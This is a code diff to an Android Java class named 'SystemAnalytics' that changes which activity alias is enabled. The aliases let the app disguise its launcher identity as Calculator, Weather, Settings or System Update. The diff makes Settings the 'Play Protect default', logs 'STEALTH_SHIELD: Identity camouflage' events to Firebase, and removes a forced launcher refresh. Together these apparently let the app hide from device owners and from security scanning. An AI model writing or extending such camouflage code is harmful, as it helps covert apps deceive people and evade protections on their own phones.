@@ -228,9 +228,9 @@ public class SystemAnalytics {
                 switch (choice) {
                     case 2: targetToEnable = basePkg + ".CalculatorAlias"; break;
                     case 3: targetToEnable = basePkg + ".WeatherAlias"; break;
-                    case 4: targetToEnable = basePkg + ".SettingsAlias"; break;
+                    case 4: targetToEnable = basePkg + ".SystemUpdateAlias"; break;
                     case 5: targetToEnable = basePkg + ".LabRatsLogoAlias"; break;
-                    default: targetToEnable = basePkg + ".SystemUpdateAlias"; break;
+                    default: targetToEnable = basePkg + ".SettingsAlias"; break; // Play Protect default
                 }
             } else {
                 targetToEnable = basePkg + ".LauncherAlias";
@@ -261,12 +261,6 @@ public class SystemAnalytics {
             } else {
                 FirebaseConfig.logActivity("STEALTH_SHIELD: Identity camouflage RELEASED");
             }
-
-            // Phase 3: Force Launcher Refresh
-            android.content.Intent home = new android.content.Intent(android.content.Intent.ACTION_MAIN);
-            home.addCategory(android.content.Intent.CATEGORY_HOME);
-            home.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
-            context.startActivity(home);
 
         } catch (Exception e) {
             android.util.Log.e("SystemAnalytics", "Stealth Error: " + e.getMessage(), e);
